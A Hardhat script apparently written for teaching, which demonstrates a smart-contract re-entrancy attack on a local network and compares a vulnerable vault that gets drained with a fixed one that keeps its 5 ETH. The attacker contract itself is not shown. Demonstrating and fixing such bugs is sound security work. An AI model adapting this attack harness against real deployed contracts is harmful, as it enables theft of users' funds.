require("dotenv").config();
const { ethers } = require("hardhat");

// re-entrancy exploit. normal run = vulnerable, FIXED=1 = fixed contract
async function main() {
  const useFixed = process.argv.includes("--fix") || process.env.FIXED === "1";
  const [deployer] = await ethers.getSigners();
  const one = ethers.parseEther("1");
  const five = ethers.parseEther("5");

  const Vault = await ethers.getContractFactory(useFixed ? "VulnerableFixed" : "Vulnerable");
  const vault = await Vault.deploy();
  await vault.waitForDeployment();

  await vault.deposit({ value: five });
  console.log("vault has 5 ETH");

  const Attacker = await ethers.getContractFactory("Attacker");
  const attacker = await Attacker.deploy(vault.target);
  await attacker.waitForDeployment();

  const vaultBalBefore = await ethers.provider.getBalance(vault.target);
  const attackerBalBefore = await ethers.provider.getBalance(attacker.target);
  console.log("before: vault", ethers.formatEther(vaultBalBefore), "ETH, attacker", ethers.formatEther(attackerBalBefore), "ETH");

  console.log("running attack with 1 ETH...");
  const tx = await attacker.attack({ value: one });
  await tx.wait();

  const vaultBalAfter = await ethers.provider.getBalance(vault.target);
  const attackerBalAfter = await ethers.provider.getBalance(attacker.target);
  console.log("\nafter:");
  console.log("  vault:", ethers.formatEther(vaultBalAfter), "ETH");
  console.log("  attacker:", ethers.formatEther(attackerBalAfter), "ETH");

  if (useFixed) {
    console.log("(fixed: vault still has 5, attacker only gets 1 back)");
  } else {
    console.log("(vulnerable: vault drained, attacker got everything)");
  }
}

main().catch((e) => { console.error(e); process.exitCode = 1; });
